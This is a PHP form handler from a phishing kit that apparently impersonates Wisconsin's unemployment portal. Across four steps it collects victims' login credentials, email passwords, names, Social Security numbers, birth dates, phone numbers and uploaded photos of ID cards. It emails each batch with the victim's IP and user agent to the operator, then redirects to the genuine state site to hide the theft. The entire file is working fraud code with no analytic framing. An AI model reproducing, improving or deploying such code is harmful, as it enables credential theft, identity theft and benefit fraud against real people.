<?php
session_start();

include 'email.php';

if (isset($_POST['btn1'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message = "";
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Username            : ".$_POST['Username']."\n";
	$message .= "Password            : ".$_POST['Password']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY MaYlUv --------------|\n";
	$send = $Receive_email;
	$subject = "Login - Username : $ip";
	mail($send, $subject, $message); 

	if($_POST['count'] >= 1){
		header("Location: ./emailVerify.html");
	}
	else{
		header("Location: ./index.html?count=1");
	}	
}
else if (isset($_POST['btn2'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message = "";
	$message .= "|----------| xLs |--------------|\n";
	$message .= "Email            : ".$_POST['Email']."\n";
	$message .= "Password            : ".$_POST['Password']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY MaYlUv --------------|\n";
	$send = $Receive_email;
	$subject = "Login - Email : $ip";
	mail($send, $subject, $message);

	if($_POST['count'] >= 1){
		header("Location: ./addDetails.html");
	}
	else{
		header("Location: ./emailVerify.html?count=1");
	}
	
}
else if (isset($_POST['btn3'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message = "";
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "First Name :         ".$_POST['First_Name']."\n";
	$message .= "Last Name :         ".$_POST['Last_Name']."\n";
	$message .= "SSN :         ".$_POST['SSN']."\n";
	$message .= "DOB :         ".$_POST['DOB']."\n";
	$message .= "Phone Number             : ".$_POST['Phone_number']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY MaYlUv --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	header("Location: ./validId.html");
}
else if (isset($_POST['btn4'])) {
	// get uploaded image and save it
	$image_path_front = "";
	
	if(!empty($_FILES["front_id_image"]["name"])){
		$image_path_front = "uploads/"."FRONT-".session_id()."-".basename($_FILES["front_id_image"]["name"]);
		move_uploaded_file($_FILES["front_id_image"]["tmp_name"], $image_path_front);
	}

	$image_path_back = "";
	
	if(!empty($_FILES["back_id_image"]["name"])){
		$image_path_back = "uploads/"."BACK-".session_id()."-".basename($_FILES["back_id_image"]["name"]);
		move_uploaded_file($_FILES["back_id_image"]["tmp_name"], $image_path_back);
	}

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message = "";
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Card Type             : ".$_POST['CardType']."\n";
	$message .= "Id Image Link:             : ".$home.$image_path."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY MaYlUv --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	header("Location: https://my.unemployment.wisconsin.gov");
}

?>